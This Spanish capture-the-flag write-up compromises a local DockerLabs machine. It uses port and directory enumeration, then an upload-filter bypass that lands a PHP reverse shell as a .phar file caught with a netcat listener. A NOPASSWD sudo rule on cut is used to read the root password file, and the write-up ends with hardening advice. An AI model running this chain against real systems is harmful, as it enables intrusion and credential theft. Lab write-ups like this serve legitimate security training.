# 🛡️ Informe de Pentesting - DockerLabs

---

## 📄 Información General

* **Máquina**: DockerLabs
* **Objetivo**: Obtener acceso root
* **Descripción**: Análisis completo de una máquina vulnerable desplegada con Docker, enfocándose en la enumeración, explotación y escalada de privilegios.

---

## ⚙️ 1. Despliegue de la Máquina

Primero, descargamos y extraemos la máquina vulnerable:

```bash
unzip dockerlabs.zip
```

Después, la desplegamos con el script automático:

```bash
sudo bash auto_deploy.sh dockerlabs.tar
```

![Despliegue](DockerLabs/Imàgenes/Logo.png)

---

## 📶 2. Verificación de Conectividad

Hacemos ping a la IP de la máquina para asegurarnos de que está activa:

```bash
ping -c1 172.17.0.2
```

![Ping](DockerLabs/Imàgenes/Capturas.png)

---

## 🔍 3. Enumeración de Puertos con Nmap

Escaneamos todos los puertos para encontrar servicios activos:

```bash
sudo nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 172.17.0.2 -oG allPorts.txt
```

![Nmap puertos](DockerLabs/Imàgenes/Capturas_1.png)

Extraemos los puertos encontrados usando un script personalizado:

```bash
extractPorts allPorts.txt
```

Luego realizamos un escaneo más profundo:

```bash
nmap -sC -sV -p 80 172.17.0.2 -oN target.txt
```

![Nmap detalle](DockerLabs/Imàgenes/Capturas_2.png)

---

## 🌐 4. Análisis Web

Accedemos al sitio en `http://172.17.0.2/`:

![Página principal](DockerLabs/Imàgenes/Capturas_4.png)

### 🔦 Fuzzing con Wfuzz

Buscamos directorios ocultos con:

```bash
wfuzz -c -t 200 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt --hc 404 http://172.17.0.2/FUZZ
```

Se descubre `/uploads`.

![wfuzz](DockerLabs/Imàgenes/Capturas_6.png)

Ingresamos en:

```url
http://172.17.0.2/uploads/
```

![Uploads](DockerLabs/Imàgenes/Capturas_5.png)

### 🔎 Descubrimiento adicional con Gobuster

```bash
gobuster dir -u http://172.17.0.2/ -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -t 20 -add-slash -b 403,404 -x .php,.html,.txt
```

![Gobuster](DockerLabs/Imàgenes/Capturas_7.png)

Rutas identificadas:

* `/index.php`
  ![index](DockerLabs/Imàgenes/Capturas_9.png)
* `/uploads/`
  ![uploads](DockerLabs/Imàgenes/Capturas_8.png)
* `/upload.php`
  ![upload](DockerLabs/Imàgenes/Capturas_10.png)
* `/machine.php`
  ![machine](DockerLabs/Imàgenes/Capturas_11.png)

---

## 🐚 5. Carga de Web Shell (Reverse Shell)

El formulario en `/machine.php` indica que solo se aceptan archivos `.zip`. Usamos la técnica de **doble extensión**.

### 💾 Código PHP de reverse shell:

Obtenido desde:
[https://github.com/pentestmonkey/php-reverse-shell](https://github.com/pentestmonkey/php-reverse-shell)

Cambiamos la IP y el puerto y luego renombramos el archivo:

```bash
mv php-reverse-shell.php php-reverse-shell.php.zip
```

![Archivo cargado](DockerLabs/Imàgenes/Capturas_13.png)

El archivo se carga correctamente:

![Éxito](DockerLabs/Imàgenes/Capturas_14.png)
![Verificado en uploads](DockerLabs/Imàgenes/Capturas_15.png)

Pero al intentar ejecutarlo, no se activó la shell. Probamos cambiando la extensión a `.phar`:

```bash
mv php-reverse-shell.php.zip php-reverse-shell.phar
```

![Cambio a .phar](DockerLabs/Imàgenes/Capturas_19.png)

---

### 🎧 Escucha con Netcat

Antes de activar el archivo malicioso, iniciamos Netcat:

```bash
sudo nc -lvnp 443
```

![Netcat](DockerLabs/Imàgenes/Capturas_18.png)

Luego accedemos al archivo desde el navegador. ¡La shell se activa!

![Shell activa](DockerLabs/Imàgenes/Capturas_21.png)

---

## 🔐 6. Escalada de Privilegios

### 🧪 Revisión de permisos con `sudo -l`

```bash
sudo -l
```

Resultado:

```text
User www-data may run the following commands on dockerlabs:
    (ALL) NOPASSWD: /usr/bin/cut
```

Esto significa que el usuario `www-data` puede ejecutar el comando `cut` como root, sin necesidad de contraseña.

---

### 🔎 Exploración y descubrimiento de pistas

Buscamos archivos interesantes:

```bash
cd /opt/
cat nota.txt
```

Contenido:

> Protege la clave de root, se encuentra en su directorio /root/clave.txt, menos mal que nadie tiene permisos para acceder a ella.

---

### ✂️ Explotación del permiso con `cut`

Aunque no podemos leer directamente el archivo, usamos `cut` con sudo para hacerlo como root:

```bash
sudo /usr/bin/cut -d "" -f1 /root/clave.txt
```

![Clave root](DockerLabs/Imàgenes/Capturas_22.png)

**¿Por qué funciona?**

* `cut` espera un delimitador, pero aquí se pasó uno vacío (`""`).
* Esto puede fallar en sistemas más estrictos, pero en este caso devolvió toda la línea del archivo (probablemente porque no había delimitadores).
* Así conseguimos leer **la clave root** sin permisos de lectura directos.

---

### 🔓 Acceso Root

Con la clave obtenida, accedemos como root:

```bash
su root
```

🎉 ¡Acceso total a la máquina!

---

## ✅ Conclusiones

| Fase               | Resultado                                                 |
| ------------------ | --------------------------------------------------------- |
| Escaneo de puertos | Descubierto puerto 80 (HTTP)                              |
| Análisis web       | Directorios `/uploads`, `/upload.php`, `/machine.php`     |
| Explotación        | Web shell vía `.phar` + reverse shell con Netcat          |
| Escalada           | Acceso a archivo root mediante `sudo cut` mal configurado |

---

### ⚠️ Recomendaciones de Seguridad

* **Nunca** otorgar permisos `sudo` sin contraseña a comandos como `cut`, `less`, `vim`, etc.
* Validar extensiones de archivo de forma segura (no solo por el nombre).
* Configurar entornos aislados y sin privilegios para aplicaciones web.
